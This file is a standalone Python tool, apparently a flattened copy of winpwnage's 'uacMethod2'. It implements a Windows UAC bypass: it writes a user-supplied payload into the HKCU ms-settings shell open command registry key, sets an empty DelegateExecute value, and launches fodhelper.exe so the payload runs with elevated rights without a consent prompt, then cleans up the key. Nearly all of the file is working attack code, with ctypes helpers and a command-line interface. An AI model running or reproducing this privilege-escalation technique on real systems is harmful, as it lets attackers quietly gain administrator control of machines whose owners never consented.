import sys
import os
import time
import argparse
import platform
import ctypes
import enum
from ctypes import *
from ctypes.wintypes import *
from __future__ import print_function

try:
	import _winreg	# Python 2
except ImportError:	# Python 3
	import winreg as _winreg

# --- Start of content from winstructures.py ---

# Wintypes
INT = c_int
LPWSTR = c_wchar_p
LPVOID = c_void_p
LPCSTR =  c_char_p
DWORD = c_uint32
SIZE_T = c_size_t
PVOID = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p
LPCTSTR = c_char_p
NTSTATUS = c_ulong
LPDWORD = POINTER(DWORD)
PULONG = POINTER(ULONG)
PHANDLE = POINTER(HANDLE)
PDWORD = POINTER(DWORD)

# Misc constants
SW_HIDE = 0
SW_SHOW = 5
MAX_PATH = 260
SEE_MASK_NOCLOSEPROCESS = 0x00000040
STATUS_UNSUCCESSFUL = ULONG(0xC0000001)

# Process constants
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
PROCESS_VM_READ = 0x0010
PROCESS_ALL_ACCESS = (0x0080 | 0x0002 | 0x0040 | 0x0400 | 0x1000 | 0x0200 | 0x0100 | 0x0800 | 0x0001 | 0x0008 | 0x0010 | 0x0020 | 0x00100000)

# Token constants
TOKEN_DUPLICATE = 0x0002
TOKEN_QUERY = 0x00000008
TOKEN_ADJUST_PRIVILEGES  = 0x00000020
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_ALL_ACCESS = (0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x00000008 | 0x0010 | 0x00000020 | 0x0040 | 0x0080 | 0x0100)
TOKEN_PRIVS = (0x00000008 | (0x00020000 | 0x00000008) | 0x0004 | 0x0010 | 0x0002 | 0x0001 | (131072 | 4))
TOKEN_WRITE = (0x00020000 | 0x0020 | 0x0040 | 0x0080)

class c_enum(enum.IntEnum):
	@classmethod
	def from_param(cls, obj):
		return c_int(cls(obj))

class TOKEN_INFORMATION_CLASS(c_enum):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class """
	TokenUser = 1
	TokenElevation = 20
	TokenIntegrityLevel = 25

class TOKEN_TYPE(c_enum):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type """
	TokenPrimary = 1
	TokenImpersonation = 2

class SECURITY_IMPERSONATION_LEVEL(INT):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level """
	SecurityAnonymous = 0
	SecurityIdentification = SecurityAnonymous + 1
	SecurityImpersonation = SecurityIdentification + 1
	SecurityDelegation = SecurityImpersonation + 1

class IntegrityLevel(object):
	""" https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids """
	SECURITY_MANDATORY_UNTRUSTED_RID = 0x00000000
	SECURITY_MANDATORY_LOW_RID = 0x00001000
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
	SECURITY_MANDATORY_MEDIUM_PLUS_RID = SECURITY_MANDATORY_MEDIUM_RID + 0x100
	SECURITY_MANDATORY_HIGH_RID = 0X00003000
	SECURITY_MANDATORY_SYSTEM_RID = 0x00004000
	SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000

class GroupAttributes(object):
	""" https://msdn.microsoft.com/en-us/windows/desktop/aa379624"""
	SE_GROUP_ENABLED = 0x00000004
	SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
	SE_GROUP_INTEGRITY = 0x00000020
	SE_GROUP_INTEGRITY_ENABLED = 0x00000040
	SE_GROUP_LOGON_ID = 0xC0000000
	SE_GROUP_MANDATORY = 0x00000001
	SE_GROUP_OWNER = 0x00000008
	SE_GROUP_RESOURCE = 0x20000000
	SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010

class LUID(Structure):
	""" https://msdn.microsoft.com/en-us/windows/desktop/dd316552 """
	_fields_ = [
				("LowPart", DWORD),
				("HighPart", LONG)
				]

class LUID_AND_ATTRIBUTES(Structure):
	""" https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ns-wdm-_luid_and_attributes """
	_fields_ = [
				("Luid", LUID),
				("Attributes", DWORD)
				]

class TOKEN_PRIVILEGES(Structure):
	"""
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges
	Used by elevate_handle_inheritance module
	"""
	_fields_ = [
				("PrivilegeCount", DWORD),
				("Privileges", LUID_AND_ATTRIBUTES * 512)
				]

class TOKEN_PRIVILEGES2(Structure):
	"""
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges
	Used by elevate_token_impersonation module
	"""
	_fields_ = [
				("PrivilegeCount", DWORD),
				("Privileges", DWORD * 3)
				]

class PROC_THREAD_ATTRIBUTE_ENTRY(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute """
	_fields_ = [
				("Attribute", DWORD),
				("cbSize", SIZE_T),
				("lpValue", PVOID)
				]

class PROC_THREAD_ATTRIBUTE_LIST(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute """
	_fields_ = [
				("dwFlags", DWORD),
				("Size", ULONG),
				("Count", ULONG),
				("Reserved", ULONG),
				("Unknown", PULONG),
				("Entries", PROC_THREAD_ATTRIBUTE_ENTRY * 1)
				]

class STARTUPINFO(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa """
	_fields_ = [
				("cb", DWORD),
				("lpReserved", LPTSTR),
				("lpDesktop", LPTSTR),
				("lpTitle", LPTSTR),
				("dwX", DWORD),
				("dwY", DWORD),
				("dwXSize", DWORD),
				("dwYSize", DWORD),
				("dwXCountChars", DWORD),
				("dwYCountChars", DWORD),
				("dwFillAttribute", DWORD),
				("dwFlags", DWORD),
				("wShowWindow", WORD),
				("cbReserved2", WORD),
				("lpReserved2", LPBYTE),
				("hStdInput", HANDLE),
				("hStdOutput", HANDLE),
				("hStdError", HANDLE)
				]

class STARTUPINFOEX(Structure):
	""" https://msdn.microsoft.com/en-us/windows/desktop/ms686329 """
	_fields_ = [
				("StartupInfo", STARTUPINFO),
				("lpAttributeList", LPVOID)
				]

class PROCESS_INFORMATION(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information """
	_fields_ = [
				("hProcess", HANDLE),
				("hThread", HANDLE),
				("dwProcessId", DWORD),
				("dwThreadId", DWORD)
				]

class SID_AND_ATTRIBUTES(Structure):
	""" https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/ns-ntifs-_sid_and_attributes """
	_fields_ = [
				("Sid", LPVOID),
				("Attributes", DWORD)
				]

class TOKEN_USER(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_user """
	_fields_ = [
				("User", SID_AND_ATTRIBUTES)
				]

class TOKEN_MANDATORY_LABEL(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label """
	_fields_ = [
				("Label", SID_AND_ATTRIBUTES)
				]

class SECURITY_ATTRIBUTES(Structure):
	""" https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85) """
	_fields_ = [
				("nLength", DWORD),
				("lpSecurityDescriptor", LPVOID),
				("bInheritHandle", BOOL)
				]

class SID_IDENTIFIER_AUTHORITY(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_identifier_authority """
	_fields_ = [
				("Value",
				BYTE * 6)
				]

class ShellExecuteInfoW(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-shellexecuteinfow """
	_fields_ = [
				("cbSize", DWORD),
				("fMask", ULONG),
				("hwnd", HWND),
				("lpVerb", LPWSTR),
				("lpFile", LPWSTR),
				("lpParameters", LPWSTR),
				("lpDirectory", LPWSTR),
				("nShow", INT),
				("hInstApp", HINSTANCE),
				("lpIDList", LPVOID),
				("lpClass", LPWSTR),
				("hKeyClass", HKEY),
				("dwHotKey", DWORD),
				("hIcon", HANDLE),
				("hProcess", HANDLE)
				]

#https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecuteexw
ShellExecuteEx = ctypes.windll.shell32.ShellExecuteExW
ShellExecuteEx.argtypes	= [POINTER(ShellExecuteInfoW)]
ShellExecuteEx.restype	= BOOL

#https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess
OpenProcess = ctypes.windll.kernel32.OpenProcess
OpenProcess.restype	 = HANDLE
OpenProcess.argtypes = [DWORD, BOOL, DWORD]

#https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle
CloseHandle = ctypes.windll.kernel32.CloseHandle
CloseHandle.argtypes = [LPVOID]
CloseHandle.restype	 = INT

#https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-queryfullprocessimagenamew
QueryFullProcessImageNameW = ctypes.windll.kernel32.QueryFullProcessImageNameW
QueryFullProcessImageNameW.argtypes = [HANDLE, DWORD, LPWSTR, POINTER(DWORD)]
QueryFullProcessImageNameW.restype 	= BOOL

#https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
GetLastError = ctypes.windll.kernel32.GetLastError
GetLastError.restype = DWORD

#https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-terminateprocess
TerminateProcess = ctypes.windll.kernel32.TerminateProcess
TerminateProcess.restype  = BOOL
TerminateProcess.argtypes = [HANDLE, UINT]

#https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
WaitForSingleObject.restype  = DWORD
WaitForSingleObject.argtypes = [HANDLE, DWORD]

def get_process_name(hProcess, dwFlags = 0):
	ERROR_INSUFFICIENT_BUFFER = 122
	dwSize = MAX_PATH
	while 1:
		lpdwSize = DWORD(dwSize)
		lpExeName = create_unicode_buffer('', lpdwSize.value + 1)
		success = QueryFullProcessImageNameW(hProcess, dwFlags, lpExeName, byref(lpdwSize))
		if success and 0 < lpdwSize.value < dwSize:
			break
		error = GetLastError()
		if error != ERROR_INSUFFICIENT_BUFFER:
			return False
		dwSize = dwSize + 256
		if dwSize > 0x1000:
			# this prevents an infinite loop in Windows 2008 when the path has spaces,
			# see http://msdn.microsoft.com/en-us/library/ms684919(VS.85).aspx#4
			return False
	return lpExeName.value
# --- End of content from winstructures.py ---


# --- Start of content from prints.py ---
table = """
 Id:    Type:           Compatible:     Description:
 ----   ------          -----------     -------------"""

class Constant:
	output = []

def reset_output():
	Constant.output = []

def print_table():
	print(table)
	Constant.output.append(("t", table))

def table_success(id, type, description):
	print(" {}\t{}\tYes\t\t{}".format(id, type, description))
	Constant.output.append(("ok", id + type + description))

def table_error(id, type, description):
	print(" {}\t{}\tNo\t\t{}".format(id, type, description))
	Constant.output.append(("error", id + type + description))

def print_success(message):
	print(" [+] " + message)
	Constant.output.append(("ok", message))

def print_error(message):
	print(" [-] " + message)
	Constant.output.append(("error", message))

def print_info(message):
	print(" [!] " + message)
	Constant.output.append(("info", message))

def print_warning(message):
	print(" [!] " + message)
	Constant.output.append(("warning", message))
# --- End of content from prints.py ---


# --- Start of content from utils.py ---
class disable_fsr():
	disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
	revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

	def __enter__(self):
		self.old_value = ctypes.c_long()
		self.success = self.disable(ctypes.byref(self.old_value))

	def __exit__(self, type, value, traceback):
		if self.success:
			self.revert(self.old_value)

class payloads():
	def exe(self, payload):
		if os.path.isfile(os.path.join(payload[0])) and payload[0].endswith(".exe"):
			commandline = ""
			for index, object in enumerate(payload):
				if index >= len(payload)-1:
					commandline += payload[index]
				else:
					commandline += payload[index] + " "
			return True, commandline
		else:
			return False

class process():
	def create(self, payload, params="", window=False, get_exit_code=False):
		shinfo = ShellExecuteInfoW()
		shinfo.cbSize = sizeof(shinfo)
		shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
		shinfo.lpFile = payload
		shinfo.nShow = SW_SHOW if window else SW_HIDE
		shinfo.lpParameters = params

		if ShellExecuteEx(byref(shinfo)):
			if get_exit_code:
				ctypes.windll.kernel32.WaitForSingleObject(shinfo.hProcess, -1)
				i = ctypes.c_int(0)
				pi = ctypes.pointer(i)
				if ctypes.windll.kernel32.GetExitCodeProcess(shinfo.hProcess, pi) != 0:
					return i.value

			return True
		else:
			return False

	def runas(self, payload, params=""):
		shinfo = ShellExecuteInfoW()
		shinfo.cbSize = sizeof(shinfo)
		shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
		shinfo.lpVerb = "runas"
		shinfo.lpFile = payload
		shinfo.nShow = SW_SHOW
		shinfo.lpParameters = params
		try:
			return bool(ShellExecuteEx(byref(shinfo)))
		except Exception as error:
			return False

	def enum_processes(self):
		# https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-enumprocesses
		EnumProcesses = ctypes.windll.psapi.EnumProcesses
		EnumProcesses.restype = BOOL
		EnumProcesses.argtypes = [LPVOID, DWORD, LPDWORD]

		size = 0x1000
		cbBytesReturned = DWORD()
		unit = sizeof(DWORD)
		dwOwnPid = os.getpid()
		while 1:
			process_ids = (DWORD * (size // unit))()
			cbBytesReturned.value = size
			EnumProcesses(byref(process_ids), cbBytesReturned, byref(cbBytesReturned))
			returned = cbBytesReturned.value
			if returned < size:
				break
			size = size + 0x1000
		process_id_list = list()
		for pid in process_ids:
			if pid is None:
				break
			if pid == dwOwnPid and pid == 0:
				continue
			process_id_list.append(pid)
		return process_id_list

	def enum_process_names(self):
		pid_to_name = {}
		for pid in self.enum_processes():
			name = False
			try:
				process_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
			except Exception as e:
				continue
			name = get_process_name(process_handle)
			if name:
				pid_to_name[pid] = name
			if process_handle:
				CloseHandle(process_handle)
		return pid_to_name

	def get_process_pid(self, processname):
		for pid, name in self.enum_process_names().items():
			if processname in name:
				return pid

	def terminate(self, processname):
		pid = self.get_process_pid(processname)
		if pid:
			try:
				phandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
				os.kill(pid, phandle)
				return True
			except Exception:
				pass
		return False

class registry():
	def __init__(self):
		self.hkeys = {
			"hkcu": _winreg.HKEY_CURRENT_USER,
			"hklm": _winreg.HKEY_LOCAL_MACHINE
		}

	def modify_key(self, hkey, path, name, value, create=False):
		try:
			if not create:
				key = _winreg.OpenKey(self.hkeys[hkey], path, 0, _winreg.KEY_ALL_ACCESS)
			else:
				key = _winreg.CreateKey(self.hkeys[hkey], os.path.join(path))
			_winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, value)
			_winreg.CloseKey(key)
			return True
		except Exception as e:
			return False

	def remove_key(self, hkey, path, name="", delete_key=False):
		try:
			if delete_key:
				_winreg.DeleteKey(self.hkeys[hkey], path)
			else:
				key = _winreg.OpenKey(self.hkeys[hkey], path, 0, _winreg.KEY_ALL_ACCESS)
				_winreg.DeleteValue(key, name)
				_winreg.CloseKey(key)
			return True
		except Exception as e:
			return False

class information():
	def system_directory(self):
		return os.path.join(os.environ.get("windir"), "system32")

	def system_drive(self):
		return os.environ.get("systemdrive")

	def windows_directory(self):
		return os.environ.get("windir")

	def architecture(self):
		return platform.machine()

	def admin(self):
		return bool(ctypes.windll.shell32.IsUserAnAdmin())

	def build_number(self):
		try:
			key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, os.path.join("Software\\Microsoft\\Windows NT\\CurrentVersion"), 0, _winreg.KEY_READ)
			cbn = _winreg.QueryValueEx(key, "CurrentBuildNumber")
			_winreg.CloseKey(key)
		except Exception as error:
			return False
		else:
			return cbn[0]

	def uac_level(self):
		try:
			key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, os.path.join("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, _winreg.KEY_READ)
			cpba = _winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")
			cpbu = _winreg.QueryValueEx(key, "ConsentPromptBehaviorUser")
			posd = _winreg.QueryValueEx(key, "PromptOnSecureDesktop")
			_winreg.CloseKey(key)
		except Exception as error:
			return False
		else:
			cpba_cpbu_posd = (cpba[0], cpbu[0], posd[0])
			return {(0, 3, 0): 1, (5, 3, 0): 2, (5, 3, 1): 3, (2, 3, 1): 4}.get(cpba_cpbu_posd, False)
# --- End of content from utils.py ---


# --- Start of content from uacMethod2.py ---
uacMethod2_info = {
	"Description": "UAC bypass using fodhelper.exe",
	"Method": "Registry key (Class) manipulation",
	"Id": "2",
	"Type": "UAC bypass",
	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
	"Works From": "10240",
	"Admin": False,
	"Function Name": "uacMethod2",
	"Function Payload": True,
}

def uacMethod2_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
		print_success("Successfully cleaned up")
		print_success("All done!")
	else:
		print_error("Unable to cleanup")
		return False

def uacMethod2(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\ms-settings\\shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payloads().exe(payload)[1], create=True):
			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
			else:
				print_error("Unable to create registry keys")
				for x in Constant.output:
					if "error" in x:
						uacMethod2_cleanup(path)
						return False
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("fodhelper.exe"):
				print_success("Successfully spawned process ({})".format(os.path.join(payloads().exe(payload)[1])))
				time.sleep(5)
				uacMethod2_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
				for x in Constant.output:
					if "error" in x:
						uacMethod2_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
# --- End of content from uacMethod2.py ---


# --- Main execution logic ---
def main():
	# --- Banner from main.py ---
	print("""
	        _
	  _ _ _|_|___ ___ _ _ _ ___ ___ ___ ___
	 | | | | |   | . | | | |   | .'| . | -_|
	 |_____|_|_|_|  _|_____|_|_|__,|_  |___|
	             |_|               |___|
	""")

	# --- Info prints from main.py ---
	print_info("UAC level: {}".format(information().uac_level()))
	print_info("Build number: {}".format(information().build_number()))
	print_info("Running elevated: {}".format(information().admin()))
	print_info("Python version: {}.{}.{}\n".format(*sys.version_info))

	# --- Simplified argument parsing ---
	parser = argparse.ArgumentParser(description="UAC bypass using fodhelper.exe (winpwnage uacMethod2).")
	parser.add_argument("-p", "--payload", nargs="+", required=True, help="Payload to execute. e.g.: -p C:\\Windows\\System32\\cmd.exe")
	args = parser.parse_args()

	# --- Execute the UAC bypass ---
	if information().admin():
		print_warning("You are already running with administrative privileges.")
		sys.exit(0)
		
	if int(information().build_number()) >= 10240:
		print_info("Attempting to bypass UAC with fodhelper method...")
		uacMethod2(payload=args.payload)
	else:
		print_error("Target OS is not vulnerable.")


if __name__ == "__main__":
	main()
